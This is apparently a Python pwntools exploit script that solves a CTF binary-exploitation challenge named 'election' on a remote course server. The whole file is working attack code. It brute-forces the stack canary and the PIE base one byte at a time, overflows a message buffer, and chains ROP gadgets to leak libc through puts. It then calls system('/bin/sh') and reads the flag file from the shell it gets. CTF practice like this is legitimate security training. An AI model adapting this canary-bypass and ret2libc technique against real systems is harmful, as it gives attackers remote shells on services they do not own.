#!/usr/bin/env python2
from pwn import *

context.clear(arch='x86_64')

# r = process('./election')
r = remote('edu-ctf.csie.org', 10180)
libc = ELF('./libc.so')
elf = ELF('./election')

# some token array
token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

offset_binsh = next(libc.search('/bin/sh'))
offset_system = libc.symbols['system']
offset_puts = elf.symbols['puts']

# accumulate vote for enough space to write buffer
angel_vote = 0
def vote(total_vote,):
    global angel_vote
    for cnt_vote in xrange(0, total_vote):
        r.sendlineafter('>', '1')
        r.sendlineafter('9]: ', '1')

        # Angelboy: Thank you!
        r.recvline()
        angel_vote += 1

    r.sendlineafter('>', '3')

def hack_vote_ret(canary, base, step):
    # 0x00000000000011a0 : pop r14 ; pop r15 ; ret: to clear 2 variables in main function
    p = ''
    pop_r14r15_ret = base + 0x00000000000011a0

    if step == 0:
        r.recvuntil('>')
        r.sendline('2')
        r.recvuntil('9]:')
        r.sendline('1')
    elif step == 1:
        r.recvuntil('>')
        r.sendline('2')
        r.recvuntil('9]:')
        r.sendline('1')

    msg = '\x87' * 0xe8
    canary = p64(canary)

    # store rbp somewhere in bss where all of them are 0 to avoid rbp corruption

    rbp = base + 0x202000
    rbp = p64(rbp)
    r.recvuntil('Message: ')
    #         |msg | cannary   |   rbp       |   ret            |)
    r.sendline(msg + canary    +  rbp        + p64(pop_r14r15_ret))

    r.recvuntil('>')
    r.sendline('3')

    if step == 0:
        r.recvuntil('>')
        r.sendline('4')
        recv_str = r.recvuntil('>').split('\n')
        libc_base = u64(recv_str[1] + '\0\0') - 0x21ab0
        return libc_base
    elif step == 1:
        r.recvuntil('>')
        r.sendline('3')
        return 0

def hack_canary_ASLR():
    canary = ''
    canary_offset = 0xb8
    guess = 0

    buf = ''
    buf += '\x87' * canary_offset

    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', buf)

    while len(canary) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                canary += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1


    aslr = ''
    guess = 0

    print('canary --> ', hex(u64(canary)))
    while len(aslr) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                aslr += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1

    print('ASLR base --> ', hex(u64(aslr) - 0x1140))
    return u64(canary), u64(aslr) - 0x1140

# craft the rop for libc base
def rop_libc_base(canary, base):
    p = ''
    ret = base + 0x906
    p += p64(ret)

    # 0x00000000000011a3 : pop rdi ; ret: to get rdi
    pop_rdi = base + 0x11a3
    p += p64(pop_rdi)

    # 0x201fe0 <__libc_start_main@GLIBC_2.2.5>, assign this to rdi
    libc_start_main = base + 0x201fe0
    p += p64(libc_start_main)

    # puts(libc_start_main)
    puts = base + offset_puts
    p += p64(puts)

    # return to main function
    addr_main = base + 0xffb
    p += p64(addr_main)

    return p

def rop_shell(canary, base, libc_base):
    p = ''

    pop_rdi = base + 0x11a3
    p += p64(pop_rdi)

    bin_sh = libc_base + offset_binsh
    p += p64(bin_sh)

    system = libc_base + offset_system
    p += p64(system)

    print('libc_base for pwn  ', hex(libc_base))
    print('bin_sh for pwn --> ', hex(bin_sh))
    print('system for pwn --> ', hex(system))

    return p

def write_token(p):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('token: ')
    r.sendline('\x00' * 0xb8)

    # write the ROP of leaking libc in token
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('token: ')
    r.sendline(p)

def vote_to_max():
    # vote for writing more buffer
    for i in xrange(0, 26):
        r.sendlineafter('>', '2')
        r.sendlineafter('token: ', token[i])
        r.sendlineafter('>', '1')
        r.sendlineafter('Token: ', token[i])

        if i < 25:
            vote(10)
        else:
            vote(5)

def main():
    # brute force finding canary, and some ASLR-shit
    canary, base = hack_canary_ASLR()

    vote_to_max()

    p1 = rop_libc_base(canary, base)
    write_token(p1)
    r.sendlineafter('>', '1')
    r.sendthen('Token: ', p1)

    libc_base = hack_vote_ret(canary, base, 0)

    # vote again for enough buffer
    vote_to_max()

    p2 = rop_shell(canary, base, libc_base)
    write_token(p2)
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil('Token: ')
    r.sendline(p2)

    hack_vote_ret(canary, base, 1)

main()
r.sendline('cat /home/`whoami`/flag')
print('FLAG --> ', r.recvuntil('}'))
r.close()
